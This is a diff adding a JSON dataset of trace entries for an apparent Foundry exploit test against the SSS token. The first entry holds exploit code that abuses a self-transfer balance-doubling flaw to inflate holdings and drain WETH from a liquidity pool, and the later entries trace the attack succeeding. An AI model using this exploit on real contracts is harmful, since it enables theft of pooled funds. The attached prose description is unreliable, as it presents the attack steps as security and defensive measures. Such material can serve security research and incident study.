@@ -1,0 +1,835 @@
+[
+    {
+        "id": "1150574",
+        "args": "",
+        "original_code": "    function testExploit() public balanceLog {\n        //Emulate flashloan here with deal\n        vm.deal(address(this), 0);\n        vm.deal(address(this), ethFlashAmt);\n        WETH.deposit{value: ethFlashAmt}();\n\n        //Buy 1 eth of tokens\n        ROUTER_V2.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            ethFlashAmt, 0, getPath(true), address(this), block.timestamp\n        );\n\n        //Transfer to self until balance reaches target bal\n        uint256 targetBal = ROUTER_V2.getAmountsIn(WETH.balanceOf(POOL) - 29.5 ether, getPath(false))[0];\n        while (SSS.balanceOf(address(this)) < targetBal) {\n            SSS.transfer(address(this), SSS.balanceOf(address(this)));\n        }\n\n        //Burn excess tokens above target to avoid OVERFLOW error on swap on pair\n        SSS.burn(SSS.balanceOf(address(this)) - targetBal);\n        assertEq(SSS.balanceOf(address(this)), targetBal, \"we exceeded target\");\n\n        //Send balance of tokens to pair to swap in a loop,to avoid multiple swap calls\n        uint256 tokensLeft = targetBal;\n        uint256 maxAmountPerTx = SSS.maxAmountPerTx();\n        uint256 SBalBeforeOnPair = SSS.balanceOf(POOL);\n        while (tokensLeft > 0) {\n            uint256 toSell = tokensLeft > maxAmountPerTx ? maxAmountPerTx - 1 : tokensLeft;\n            SSS.transfer(POOL, toSell);\n            tokensLeft -= toSell;\n        }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function simulates a series of actions to test a specific scenario involving token swaps and transfers. It starts by emulating a flash loan, where it temporarily receives a large amount of Ether (ETH). It then uses this ETH to buy tokens through a swap mechanism. After acquiring the tokens, it repeatedly transfers them to itself until a target balance is reached. Excess tokens are burned to avoid overflow errors. Finally, the tokens are sent to a pool in smaller chunks to simulate a swap process without triggering multiple swap calls.\n\n2. Security mechanism:  \nThe function uses the `balanceLog` modifier, which likely tracks or logs balance changes for security or debugging purposes. It also includes assertions (`assertEq`) to ensure that the token balance matches the expected target, preventing unintended behavior. Additionally, the function burns excess tokens to avoid overflow errors, which is a defensive measure to maintain system stability. The use of `maxAmountPerTx` ensures that token transfers are done in manageable amounts, reducing the risk of errors or exploits.\n\n3. Parameter Function:  \nThe function does not take any explicit parameters. However, it relies on predefined variables like `ethFlashAmt` (the amount of ETH for the flash loan), `getPath` (a function to determine swap paths), and `POOL` (the address of the token pool). These variables guide the behavior of the function, such as how much ETH to use, which tokens to swap, and where to send the tokens.\n\n4. Return description:  \nThe function does not return any value. Instead, it performs a series of actions and checks to ensure that the token balance meets the target. The final assertion verifies that the balance of tokens in the contract matches the expected target, ensuring the test scenario is executed correctly.\n\nIn summary,  \nThe `testExploit` function is a simulation that tests a specific token swap and transfer scenario. It uses security measures like balance logging, assertions, and token burning to ensure correctness and prevent errors. The function relies on predefined variables to guide its behavior and does not return any value, focusing instead on executing and verifying the test scenario.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "8346",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"WETH\""
+    },
+    {
+        "id": "3323",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"WETH\""
+    },
+    {
+        "id": "9925",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "9405",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "811",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "294",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "0",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "190941",
+        "args": "1000000000000000000 [1e18], 0, [0x4300000000000000000000000000000000000004, 0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed], SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1711030305 [1.711e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "35815",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x92F32553cC465583d432846955198F0DDcBcafA1, 1000000000000000000 [1e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "35286",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x92F32553cC465583d432846955198F0DDcBcafA1, 1000000000000000000 [1e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2562",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1423296282915869488088 [1.423e21], 104180797942977573825697523777868 [1.041e32], 1711030303 [1.711e9]"
+    },
+    {
+        "id": "1430",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "1424296282915869488088 [1.424e21]"
+    },
+    {
+        "id": "910",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "1424296282915869488088 [1.424e21]"
+    },
+    {
+        "id": "135164",
+        "args": "0, 72926171031646968179161844570 [7.292e28], SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "87737",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 72926171031646968179161844570 [7.292e28]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1430",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "1424296282915869488088 [1.424e21]"
+    },
+    {
+        "id": "910",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "1424296282915869488088 [1.424e21]"
+    },
+    {
+        "id": "671",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "104107871771945926857518361933298 [1.041e32]"
+    },
+    {
+        "id": "4199",
+        "args": "1424296282915869488088 [1.424e21], 104107871771945926857518361933298 [1.041e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3596",
+        "args": "0x98994a9A7a2570367554589189dC9772241650f6, 1000000000000000000 [1e18], 0, 0, 72926171031646968179161844570 [7.292e28], SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "71467647611014028815578607679 [7.146e28]"
+    },
+    {
+        "id": "1430",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "1424296282915869488088 [1.424e21]"
+    },
+    {
+        "id": "910",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "1424296282915869488088 [1.424e21]"
+    },
+    {
+        "id": "4424",
+        "args": "1394796282915869488088 [1.394e21], [0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed, 0x4300000000000000000000000000000000000004]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[4937159701810249525240596925757150 [4.937e33], 1394796282915869488088 [1.394e21]]"
+    },
+    {
+        "id": "562",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1424296282915869488088 [1.424e21], 104107871771945926857518361933298 [1.041e32], 1711030305 [1.711e9]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "71467647611014028815578607679 [7.146e28]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "71467647611014028815578607679 [7.146e28]"
+    },
+    {
+        "id": "30679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 71467647611014028815578607679 [7.146e28]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "142935295222028057631157215358 [1.429e29]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "142935295222028057631157215358 [1.429e29]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 142935295222028057631157215358 [1.429e29]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "285870590444056115262314430716 [2.858e29]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "285870590444056115262314430716 [2.858e29]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 285870590444056115262314430716 [2.858e29]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "571741180888112230524628861432 [5.717e29]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "571741180888112230524628861432 [5.717e29]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 571741180888112230524628861432 [5.717e29]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1143482361776224461049257722864 [1.143e30]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1143482361776224461049257722864 [1.143e30]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1143482361776224461049257722864 [1.143e30]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2286964723552448922098515445728 [2.286e30]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2286964723552448922098515445728 [2.286e30]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2286964723552448922098515445728 [2.286e30]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4573929447104897844197030891456 [4.573e30]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4573929447104897844197030891456 [4.573e30]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4573929447104897844197030891456 [4.573e30]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9147858894209795688394061782912 [9.147e30]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9147858894209795688394061782912 [9.147e30]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9147858894209795688394061782912 [9.147e30]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "18295717788419591376788123565824 [1.829e31]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "18295717788419591376788123565824 [1.829e31]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18295717788419591376788123565824 [1.829e31]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "36591435576839182753576247131648 [3.659e31]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "36591435576839182753576247131648 [3.659e31]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 36591435576839182753576247131648 [3.659e31]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "73182871153678365507152494263296 [7.318e31]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "73182871153678365507152494263296 [7.318e31]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 73182871153678365507152494263296 [7.318e31]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "146365742307356731014304988526592 [1.463e32]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "146365742307356731014304988526592 [1.463e32]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 146365742307356731014304988526592 [1.463e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "292731484614713462028609977053184 [2.927e32]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "292731484614713462028609977053184 [2.927e32]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 292731484614713462028609977053184 [2.927e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "585462969229426924057219954106368 [5.854e32]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "585462969229426924057219954106368 [5.854e32]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 585462969229426924057219954106368 [5.854e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1170925938458853848114439908212736 [1.17e33]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1170925938458853848114439908212736 [1.17e33]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1170925938458853848114439908212736 [1.17e33]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2341851876917707696228879816425472 [2.341e33]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2341851876917707696228879816425472 [2.341e33]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2341851876917707696228879816425472 [2.341e33]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4683703753835415392457759632850944 [4.683e33]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4683703753835415392457759632850944 [4.683e33]"
+    },
+    {
+        "id": "26679",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4683703753835415392457759632850944 [4.683e33]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9367407507670830784915519265701888 [9.367e33]"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9367407507670830784915519265701888 [9.367e33]"
+    },
+    {
+        "id": "7944",
+        "args": "4430247805860581259674922339944738 [4.43e33]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4937159701810249525240596925757150 [4.937e33]"
+    },
+    {
+        "id": "0",
+        "args": "4937159701810249525240596925757150 [4.937e33], 4937159701810249525240596925757150 [4.937e33], \"we exceeded target\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "385",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555555555555555000000000000000000 [5.555e32]"
+    },
+    {
+        "id": "671",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "104107871771945926857518361933298 [1.041e32]"
+    },
+    {
+        "id": "14524",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1, 555555555555554999999999999999999 [5.555e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12524",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1, 555555555555554999999999999999999 [5.555e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12524",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1, 555555555555554999999999999999999 [5.555e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12524",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1, 555555555555554999999999999999999 [5.555e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12524",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1, 555555555555554999999999999999999 [5.555e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12524",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1, 555555555555554999999999999999999 [5.555e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12524",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1, 555555555555554999999999999999999 [5.555e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12524",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1, 555555555555554999999999999999999 [5.555e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12524",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1, 492715257365809525240596925757158 [4.927e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "671",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "4942524379545990461593303349175313 [4.942e33]"
+    },
+    {
+        "id": "4356",
+        "args": "4838416507774044534735784987242015 [4.838e33], [0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed, 0x4300000000000000000000000000000000000004]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[4838416507774044534735784987242015 [4.838e33], 1394206960661228599440 [1.394e21]]"
+    },
+    {
+        "id": "562",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1424296282915869488088 [1.424e21], 104107871771945926857518361933298 [1.041e32], 1711030305 [1.711e9]"
+    },
+    {
+        "id": "72703",
+        "args": "1394206960661228599440 [1.394e21], 0, SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "51148",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1394206960661228599440 [1.394e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "50625",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1394206960661228599440 [1.394e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1430",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "30089322254640888648 [3.008e19]"
+    },
+    {
+        "id": "910",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "30089322254640888648 [3.008e19]"
+    },
+    {
+        "id": "671",
+        "args": "0x92F32553cC465583d432846955198F0DDcBcafA1",
+        "original_code": null,
+        "description": null,
+        "return_value": "4942524379545990461593303349175313 [4.942e33]"
+    },
+    {
+        "id": "2199",
+        "args": "30089322254640888648 [3.008e19], 4942524379545990461593303349175313 [4.942e33]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3596",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 4838416507774044534735784987242015 [4.838e33], 1394206960661228599440 [1.394e21], 0, SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "64211",
+        "args": "ECRecover: [0x0000000000000000000000000000000000000001], 1000000000000000000 [1e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "63688",
+        "args": "ECRecover: [0x0000000000000000000000000000000000000001], 1000000000000000000 [1e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1925",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1393206960661228599440 [1.393e21]"
+    },
+    {
+        "id": "1405",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1393206960661228599440 [1.393e21]"
+    },
+    {
+        "id": "0",
+        "args": "1393206960661228599440 [1.393e21], 1393206960661228599440 [1.393e21], \"Not expected WETH BAL\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "671",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "0, 0, \"All SSS tokens didn't get sold\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1846",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"WETH\""
+    },
+    {
+        "id": "1323",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"WETH\""
+    },
+    {
+        "id": "1925",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1393206960661228599440 [1.393e21]"
+    },
+    {
+        "id": "1405",
+        "args": "SSSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1393206960661228599440 [1.393e21]"
+    },
+    {
+        "id": "811",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "294",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    }
+]
